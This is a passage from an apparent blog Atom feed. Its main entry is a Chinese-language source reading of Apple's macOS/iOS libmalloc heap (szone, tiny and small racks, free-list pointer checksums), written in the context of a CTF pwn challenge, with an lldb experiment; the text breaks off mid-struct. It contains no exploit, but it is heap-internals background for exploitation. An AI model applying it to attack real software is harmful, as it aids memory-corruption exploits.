    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be 